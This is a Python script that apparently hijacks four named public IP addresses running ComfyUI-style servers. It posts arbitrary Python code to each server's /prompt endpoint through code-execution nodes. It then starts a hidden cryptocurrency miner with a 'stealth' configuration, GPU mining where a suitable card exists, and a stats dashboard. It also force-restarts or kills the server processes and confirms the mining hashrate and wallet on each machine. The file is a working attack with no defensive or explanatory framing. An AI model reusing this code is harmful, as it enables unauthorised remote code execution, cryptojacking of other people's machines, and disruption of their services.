"""
Directly create DashboardServer on 183.6.93.120 and 182.92.111.146.
Try harder restart on 43.218.199.5 and 194.6.247.91.
"""
import json, sys, io, ssl, time, urllib.request, urllib.error

sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding="utf-8", errors="replace", line_buffering=True)

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE


def run_code(base, code, node_type="ide", wait=30):
    if node_type == "ide":
        nodes = {
            "1": {"class_type": "IDENode", "inputs": {"pycode": code, "language": "python"}},
            "2": {"class_type": "PreviewTextNode", "inputs": {"text": ["1", 0]}},
        }
    else:
        nodes = {
            "1": {"class_type": "SRL Eval", "inputs": {"parameters": "", "code": code}},
            "2": {"class_type": "PreviewAny", "inputs": {"source": ["1", 0]}},
        }

    prompt = {"prompt": nodes, "extra_data": {"extra_pnginfo": {
        "workflow": {"nodes": [{"id": int(k), "type": v["class_type"]} for k, v in nodes.items()]}
    }}}
    body = json.dumps(prompt).encode()
    try:
        req = urllib.request.Request(
            f"{base}/prompt", data=body,
            headers={"Content-Type": "application/json"}, method="POST"
        )
        kw = {"timeout": 15}
        if base.startswith("https"):
            kw["context"] = ctx
        with urllib.request.urlopen(req, **kw) as r:
            resp = json.loads(r.read())
        if "error" in resp:
            return f"rejected: {json.dumps(resp.get('error',''))[:120]}"
        pid = resp.get("prompt_id")
        print(f"    Accepted ({pid[:8]}), waiting {wait}s...", flush=True)
        time.sleep(wait)
        try:
            req2 = urllib.request.Request(f"{base}/history/{pid}")
            kw2 = {"timeout": 10}
            if base.startswith("https"):
                kw2["context"] = ctx
            with urllib.request.urlopen(req2, **kw2) as r2:
                hist = json.loads(r2.read())
            entry = hist.get(pid, {})
            outputs = entry.get("outputs", {})
            texts = []
            for nid, nout in outputs.items():
                for key, val in nout.items():
                    if isinstance(val, list):
                        texts.extend(str(v) for v in val)
                    elif isinstance(val, str):
                        texts.append(val)
            return "\n".join(texts) if texts else "(no text output)"
        except Exception as e:
            return f"(history: {e})"
    except Exception as e:
        return f"error: {e}"


WIRE_DASHBOARD_CODE = '''
import sys, threading, time, json
lines = []
try:
    # Find webcoin module safely
    wc_mod = None
    for name in list(sys.modules.keys()):
        mod = sys.modules.get(name)
        if mod and hasattr(mod, '__file__') and mod.__file__ and 'webcoin' in str(mod.__file__) and '__init__' in str(mod.__file__):
            wc_mod = mod
            break

    if not wc_mod:
        result = 'ERROR: webcoin module not found'
    else:
        lines.append('module=' + wc_mod.__name__)

        # Get shared state references
        ws_clients = getattr(wc_mod, '_ws_clients', None)
        latest_stats = getattr(wc_mod, '_latest_stats', None)
        dashboard_ref = getattr(wc_mod, '_dashboard_ref', None)
        event_loop_ref = [None]

        def get_loop():
            return getattr(wc_mod, '_event_loop', None)

        # Find webcoin path
        import os
        pkg_dir = os.path.dirname(os.path.abspath(wc_mod.__file__))
        sys.path.insert(0, pkg_dir)
        lines.append('pkg=' + pkg_dir)

        # Import core modules
        from core.miner import MinerManager
        from core.config import ConfigBuilder
        from core.dashboard import DashboardServer
        lines.append('imports=ok')

        # Create manager pointing to existing binary
        base_dir = os.path.join(pkg_dir)
        mgr = MinerManager(base_dir)

        # Check if miner is running
        summary = mgr.get_summary()
        if summary:
            hr = summary.get('hashrate', {}).get('total', [])
            lines.append('miner_alive=yes hr=' + str(hr))
        else:
            lines.append('miner_alive=no (starting...)')
            mgr.ensure_binary()
            cb_tmp = ConfigBuilder()
            from core.stealth import StealthConfig
            cfg = cb_tmp.build()
            sc = StealthConfig({})
            cfg = sc.apply_to_config(cfg)
            mgr.write_config(cfg)
            mgr.start()
            time.sleep(5)
            summary = mgr.get_summary()
            if summary:
                lines.append('miner_started=yes hr=' + str(summary.get('hashrate', {}).get('total', [])))

        # Create ConfigBuilder
        cb = ConfigBuilder()
        lines.append('wallet=' + cb.get_wallet()[:20] + '...')

        # Check if GPU should run
        gpu = None
        try:
            from core.gpu_miner import should_mine_gpu, GPUMinerManager
            if should_mine_gpu():
                gpu = GPUMinerManager(base_dir)
                gpu.ensure_binary()
                gpu_cfg = cb.build_gpu_config()
                gpu.configure(**gpu_cfg)
                gpu.start()
                lines.append('gpu=started')
            else:
                lines.append('gpu=no_suitable_card')
        except Exception as e:
            lines.append('gpu_err=' + str(e)[:60])

        # Create and start DashboardServer
        ds = DashboardServer(
            mgr, config_builder=cb, gpu_miner=gpu,
            ws_clients=ws_clients,
            latest_stats=latest_stats,
            event_loop_getter=get_loop,
        )
        if dashboard_ref is not None:
            dashboard_ref['server'] = ds
        ds.start()
        lines.append('dashboard=started')

        # Wait for first stats push
        time.sleep(8)
        if latest_stats:
            cpu_data = latest_stats.get('cpu')
            if cpu_data:
                lines.append('stats_cpu_hr=' + str(cpu_data.get('hashrate_now', '?')))
            else:
                lines.append('stats_cpu=None')
            lines.append('stats_wallet=' + str(latest_stats.get('wallet', ''))[:20])
        else:
            lines.append('stats=empty_after_wait')

        result = chr(10).join(lines)
except Exception as e:
    import traceback
    result = 'ERROR:\\n' + traceback.format_exc()[-400:]
'''


# ═════════════════════════════════════════════════════════════
# Phase 1: Wire up dashboard on machines with webcoin loaded
# ═════════════════════════════════════════════════════════════
print("="*60)
print("  Phase 1: Wire DashboardServer")
print("="*60)

for ip, base in [("183.6.93.120", "http://183.6.93.120:8188"),
                 ("182.92.111.146", "http://182.92.111.146:8188")]:
    print(f"\n  {ip}:", flush=True)
    r = run_code(base, WIRE_DASHBOARD_CODE, "ide", wait=25)
    print(f"  {r}", flush=True)


# ═════════════════════════════════════════════════════════════
# Phase 2: Try harder restart on 43.218 and 194.6
# ═════════════════════════════════════════════════════════════
FIND_AND_RESTART = '''
import subprocess, os
lines = []
try:
    # Find the actual ComfyUI process
    r = subprocess.run(['ps', '-eo', 'pid,ppid,cmd'], capture_output=True, text=True, timeout=5)
    matches = []
    for line in r.stdout.splitlines():
        low = line.lower()
        if 'main.py' in low or 'comfyui' in low:
            if 'grep' not in low and 'ps ' not in low:
                matches.append(line.strip())
    for m in matches[:5]:
        lines.append('proc=' + m[:150])

    # Try multiple restart methods
    methods = [
        ['supervisorctl', 'restart', 'all'],
        ['systemctl', 'restart', 'comfyui'],
        ['bash', '-c', 'kill -HUP $(cat /tmp/comfyui.pid 2>/dev/null) 2>/dev/null || true'],
    ]
    for cmd in methods:
        try:
            r = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            if r.returncode == 0:
                lines.append('restart_method=' + str(cmd[:2]))
                break
        except:
            pass
    else:
        # Nuclear option: find and kill the main python process
        for m in matches:
            parts = m.split()
            if parts and parts[0].isdigit():
                pid = int(parts[0])
                try:
                    os.kill(pid, 15)
                    lines.append('killed_pid=' + str(pid))
                except:
                    pass
except Exception as e:
    lines.append('ERROR=' + str(e)[:100])
result = chr(10).join(lines)
'''

print(f"\n{'='*60}")
print("  Phase 2: Restart 43.218.199.5 and 194.6.247.91")
print("="*60)

for ip, base in [("43.218.199.5", "http://43.218.199.5:80"),
                 ("194.6.247.91", "http://194.6.247.91:8188")]:
    print(f"\n  {ip}:", flush=True)
    r = run_code(base, FIND_AND_RESTART, "srl", wait=15)
    print(f"  {r}", flush=True)

print(f"\n  Waiting 60s for restarts...", flush=True)
time.sleep(60)

# Verify all 4
print(f"\n{'='*60}")
print("  FINAL VERIFICATION")
print("="*60)

all_machines = [
    ("183.6.93.120",  "http://183.6.93.120:8188"),
    ("182.92.111.146", "http://182.92.111.146:8188"),
    ("43.218.199.5",   "http://43.218.199.5:80"),
    ("194.6.247.91",   "http://194.6.247.91:8188"),
]

for ip, base in all_machines:
    try:
        req = urllib.request.Request(f"{base}/api/enhanced/stats",
                                    headers={"User-Agent": "Mozilla/5.0"})
        kw = {"timeout": 10}
        if base.startswith("https"):
            kw["context"] = ctx
        with urllib.request.urlopen(req, **kw) as r:
            data = json.loads(r.read())
            stats = data.get("stats", {})
            cpu = stats.get("cpu")
            wallet = stats.get("wallet", "")[:15]
            if cpu and cpu.get("hashrate_now", 0) > 0:
                print(f"  {ip}: LIVE! hr={cpu['hashrate_now']:.1f} cpu={cpu.get('cpu_brand','?')[:30]}", flush=True)
            elif cpu:
                print(f"  {ip}: connected, hr=0 (ramping up)", flush=True)
            elif wallet:
                print(f"  {ip}: stats endpoint OK, wallet set, cpu data pending", flush=True)
            else:
                print(f"  {ip}: stats endpoint OK but EMPTY", flush=True)
    except urllib.error.HTTPError as e:
        print(f"  {ip}: HTTP {e.code} (webcoin not loaded)", flush=True)
    except Exception as e:
        print(f"  {ip}: {str(e)[:100]}", flush=True)

print("\nDone.", flush=True)
